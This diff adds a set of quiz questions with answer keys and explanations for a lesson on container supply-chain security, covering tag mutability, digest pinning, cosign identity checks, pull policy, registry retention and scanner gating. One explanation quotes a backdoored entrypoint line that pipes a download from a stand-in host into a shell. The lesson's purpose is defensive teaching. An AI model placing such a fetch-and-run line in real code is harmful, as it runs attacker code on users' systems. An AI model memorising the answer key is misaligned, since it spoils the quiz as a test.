@@ -1,0 +1,74 @@
+[
+  {
+    "stage": "pre",
+    "question": "Three nodes in one fleet run the same Deployment with `image: registry.internal/app:1.0`. Node A was scheduled Tuesday, node B came up Wednesday when the autoscaler added capacity, and node C rebooted at 02:03 Thursday after a kernel patch and pulled fresh because its disk cache was gone. A bug reproduces on one node in six. What is the most likely explanation, and what would your tooling tell you?",
+    "options": [
+      "The nodes have different kernel or CPU features, so the same bytes behave differently — compare `uname -r` and the node labels",
+      "Node C's pull was interrupted and it is running a partially-extracted image; the layer digests on disk will not match the manifest",
+      "They are running three different builds. A tag is a mutable pointer in the registry's database, so a re-push between Tuesday and Thursday changes what the identical reference string resolves to — and nothing reports it, because every pod's `APP_VERSION` still says 1.0 and every dashboard aggregates all three",
+      "Kubernetes cached the manifest at the first pull, so nodes B and C are running a stale copy of an image that has since been corrected"
+    ],
+    "correct": 2,
+    "explanation": "This is the misconception the lesson exists to remove: a tag is not a version, it is a name in a mutable key-value table `(repository, tag) -> manifest digest` that anybody with push access can re-point in one database write — no new identifier, no version bump, no audit trail a client can see. The lesson measured exactly this: two pulls of the byte-identical reference `registry.internal/app:1.0` returned `sha256:f29d198c...` and `sha256:2e3da6b0...`, with the second entrypoint carrying `os.system('curl evil.sh|sh')` while still reporting build 8f21c4 — because the attacker wrote that string and nothing in the pull path can contradict it. Option 4 is nearly the opposite of the truth: pulls are cached by *content*, so a cached layer is always valid. The benign version of this failure is a careless colleague; the hostile version is a leaked CI token, and both are the same one-line write. Pulling by tag is trust-on-every-pull, forever, on every reboot and every autoscale event."
+  },
+  {
+    "stage": "check",
+    "question": "You are pinning images by digest for the first time. `crane digest registry.internal/app:1.1` on your amd64 CI runner prints `sha256:021ff5d9dff0...`, so you write that into the Deployment. Everything works for months. Then the platform team adds an arm64 node pool and pods scheduled there fail to start. What went wrong?",
+    "options": [
+      "arm64 nodes need `imagePullPolicy: Always` because the digest is recomputed locally with a different compression setting",
+      "You pinned a platform-specific manifest instead of the image index. The tag pointed at an index (`sha256:f0f8e9b7712b`) listing one manifest per platform — `sha256:021ff5d9dff0` for linux/amd64 and `sha256:6903a610c98a` for linux/arm64 — so pinning the amd64 manifest silently pinned your architecture too",
+      "Digests are registry-specific, so a digest resolved against one registry endpoint is not valid on nodes that use a pull-through cache",
+      "The arm64 image was never built; the index only ever contained one platform and the failure is a missing build, not a pinning mistake"
+    ],
+    "correct": 1,
+    "explanation": "A tag does not have to point at an image — it can point at an image index (OCI's name; Docker calls it a manifest list), a small JSON document listing one manifest per `os`/`architecture` pair. The client picks the entry matching the machine it runs on, which is why `latest` on an Apple Silicon laptop and `latest` on an x86 cluster can legitimately be different bytes with nobody at fault. Pin the **index** digest, not a platform's. Option 3 is the plausible-sounding wrong answer and the reverse is true: a digest is a content address, valid against any registry or mirror holding those bytes — that is exactly what makes a pull-through cache safe. Note how cheap the second architecture was here: only the base OS and the interpreter are arch-specific, so the arm64 variant added 73.0 MiB rather than another 84.0 MiB, because the pure-Python wheels and the application code are shared blobs."
+  },
+  {
+    "stage": "check",
+    "question": "Your CI runs `cosign verify registry.internal/app@${DIGEST}` after every build and the step passes. A colleague says the supply chain is now covered: only signed images reach production. What is the gap?",
+    "options": [
+      "Verification must run at admission time, not in CI — but beyond that the check itself is complete, since a valid signature can only come from your pipeline",
+      "The signature covers the manifest but not the layer blobs, so an attacker can substitute a layer without invalidating it",
+      "`cosign verify` with no `--certificate-identity-regexp` and `--certificate-oidc-issuer` only proves that *somebody* signed it. Anyone can sign anything. The two identity flags are the actual trust decision: this artifact was signed by a workflow in this repository, authenticated by this issuer",
+      "Keyless signing produces certificates valid for about ten minutes, so a verification run more than ten minutes after the build will fail and the passing step means the check is being skipped"
+    ],
+    "correct": 2,
+    "explanation": "Verifying a signature without pinning the identity answers 'is this signed?' rather than 'is this ours?', and the first question has no security content — signing is free and open to everyone. `--certificate-identity-regexp '^https://github\\.com/acme/app/\\.github/workflows/.+'` plus `--certificate-oidc-issuer https://token.actions.githubusercontent.com` is where the trust actually lives. The lesson separates two failures that both return False: a valid signature transplanted onto the backdoored manifest `sha256:2e3da6b042ac` fails because the digest is part of what was signed, and a cryptographically *valid* HMAC made with the rotated `release-2025-q4` key also fails because trust is a policy question, not a maths question. Option 4 misreads keyless signing: the certificate is short-lived so there is no long-lived key to steal, but the signature and certificate are published to a public append-only transparency log, so verification checks that the signature was made while the certificate was valid — years later, by anyone."
+  },
+  {
+    "stage": "check",
+    "question": "Your Deployments now reference images by digest. A reviewer objects to `imagePullPolicy: IfNotPresent`, arguing that a node could serve a stale or tampered cached layer and that `Always` is the safe choice. How should you answer?",
+    "options": [
+      "They are right for a different reason: `Always` is required because a digest reference does not include the registry hostname, so `IfNotPresent` can match a same-named image from another registry",
+      "They are right — `IfNotPresent` skips the registry round-trip and therefore skips digest verification, which is why Kubernetes defaults `:latest` to `Always`",
+      "Split the difference: use `Always` in production for the audit trail of a registry pull per pod start, and `IfNotPresent` elsewhere",
+      "With a digest, `IfNotPresent` is not merely safe but strictly correct: a cached blob whose sha256 matches the requested digest *is* the requested content, by definition, and the content address can never go stale. `Always` exists to work around mutable tags — which is why Kubernetes special-cases `:latest` to default to `Always` — and it puts a registry round-trip in the recovery path of every pod start"
+    ],
+    "correct": 3,
+    "explanation": "Content addressing means the storage key is the hash of the value, which buys integrity, deduplication and always-correct caching from one mechanism. Integrity is not theoretical: flipping a single bit in a 421,888-byte layer (byte 169,781, 0x3e to 0x3f) changed 58 of the 64 hex digits of the digest, so an unverified read returns 421,888 bytes and no error while a verified read rejects it. The same property is why ten releases of one service occupy 99.6 MiB instead of 839.3 MiB — an 88.1% saving from 26 dedup hits across 60 blob puts, with nothing compressed. The operational point behind the correct answer matters at 03:00: `Always` makes the registry a hard dependency of every pod start, so a registry outage or a `TOOMANYREQUESTS` rate limit stops you recovering from an unrelated incident. The default is in fact `IfNotPresent` for everything except a `:latest` tag, and that exception tells you what Kubernetes thinks of mutable tags."
+  },
+  {
+    "stage": "post",
+    "question": "Your Deployment pins `app@sha256:f0f8e9b...`, and the registry has a lifecycle policy expiring untagged images after 14 days to control the storage bill. Six weeks after a release, an incident requires rolling back to it. What happens, and what is the right lifecycle rule?",
+    "options": [
+      "The rollback silently resolves to the nearest surviving image, so it appears to succeed while running the wrong artifact",
+      "The pull fails with `MANIFEST_UNKNOWN` and the rollback stops — which is the pinned path failing closed as designed. Fix the policy, not the pinning: keep the last N tagged releases indefinitely, exempt anything currently referenced by a running workload, expire only untagged images, and confirm the rollback window is shorter than the retention window before enabling it",
+      "Nothing — the manifest is retained because the Deployment still references it, and registries do not expire referenced digests",
+      "The pull succeeds from a node's local cache if any node still has the layers, so the rollback works on some nodes and fails on others, producing a split fleet"
+    ],
+    "correct": 1,
+    "explanation": "This is the property that makes pinning safe to depend on rather than merely different: a pin either returns the exact bytes or it fails. It never quietly resolves to something else — option 1 describes a tag's failure mode, which is success with the wrong content, the worst failure mode a system can have. Option 3 states a comforting untruth: ECR, GAR and ACR have no idea what your cluster is running, they charge per GB-month and they expire on age or count. And option 4 is worth ruling out explicitly: a cached layer on one node is not a manifest, and a scale-up onto a fresh node still needs the registry. The general rule is that your retention window must exceed your rollback window, and that is a number you should be able to state — if you cannot roll back to a six-week-old release, say so deliberately rather than discovering it during an incident."
+  },
+  {
+    "stage": "post",
+    "question": "Your pipeline gates on 'no MEDIUM or above findings'. The current release scans clean except for one MEDIUM in `perl-base`, which sits in the base image, is never loaded by your application, and has an empty `fixed_in` because no upstream patch exists. Releases are now blocked. What is the correct response?",
+    "options": [
+      "Rebuild on a distroless base to remove `perl-base`, then keep the gate as it is — the count is the metric that matters and it should reach zero",
+      "Suppress the finding in the scanner's config so the pipeline goes green, and revisit when an upstream fix appears",
+      "Change what you gate on. Block on findings that are *reachable* and *fixable* above a severity; require a named, expiring exception for everything else; and track the age of your oldest unpatched base image as the number that actually correlates with risk. 'Zero criticals' is a statement about what you chose to count, not about whether you can be attacked",
+      "Lower the gate to 'no HIGH or above', which unblocks this release and keeps a meaningful bar"
+    ],
+    "correct": 2,
+    "explanation": "The false-positive problem is structural, not a scanner bug: a scanner reads your SBOM, not your call graph, so an XML parser your service never invokes is a finding with the same severity as the TLS library you use on every request. The lesson measured both halves — `app:1.0` had 5 findings of which 2 were in packages the image actually loads, and after the upgrade `app:1.1` had 1 finding and 0 reachable — and both statements are true while only one is about risk. Option 1 is the tempting engineering answer and is often a genuinely good idea, but as a *response to the gate* it treats an unfalsifiable metric as a goal; you will meet the same wall on the next unfixable base-image finding. Option 4 just moves the arbitrary line. Option 2 is what teams actually do under deadline pressure, and it is how suppression lists grow until they match everything — if you suppress, do it as a named, dated, expiring exception, and note that VEX exists precisely to publish 'we ship this and it is not exploitable in our configuration' as a machine-readable statement rather than a comment in a spreadsheet."
+  }
+]
